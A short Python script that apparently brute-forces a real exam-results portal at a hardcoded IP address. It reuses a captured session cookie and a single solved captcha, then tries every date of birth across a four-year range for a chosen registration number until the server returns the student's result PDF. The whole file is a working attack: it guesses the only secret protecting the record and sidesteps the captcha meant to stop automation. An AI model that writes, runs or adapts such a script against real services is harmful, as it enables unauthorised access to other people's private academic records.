import aiohttp
import asyncio
import pandas as pd
import time

URL = 'http://101.251.6.66/index.php'
COOKIE_CODE = '3lalhal8bdc2q8kejhl0iauph3'
CAPTCHA = '74978'
REGISTRATION_NUMBER = 'Enter Registration Number Here'
START_DATE = '1999-05-12' #approx start_date
END_DATE = '2003-06-12' #approx end_date
EXAM_TYPE='Regular'
EXAM_YEAR ='2022'
SEMESTER_YEAR = 'I'
SEMESTER_PART = 'II'
HEADERS = {
    'Cookie': f'PHPSESSID={COOKIE_CODE}',
    'Content-Type': 'application/x-www-form-urlencoded'
}

DATES = pd.date_range(start=START_DATE, end=END_DATE)
start_time = time.time()

async def main():
    async with aiohttp.ClientSession() as session:
        for date in DATES:
            payload = {
                "mode": "resView",
                "frmAction": "submit",
                "regNumber": REGISTRATION_NUMBER,
                "dob": f"{str(date)[:10]}",
                "examType": EXAM_TYPE,
                "examYear": EXAM_YEAR,
                "semYear": SEMESTER_YEAR,
                "semPart": SEMESTER_PART,
                "captcha": str(CAPTCHA)
            }

            async with session.post(URL, headers=HEADERS, data=payload) as resp:
                if resp.headers['Content-Type'] == 'application/pdf':
                    res = await resp.read()
                    with open('result.pdf', 'wb') as f:
                        f.write(res)
                        print('result acquired successfully')
                        return
        print('session expired!! you have to update the cookie code and captcha')
asyncio.run(main())
print("--- %s seconds ---" % (time.time() - start_time))
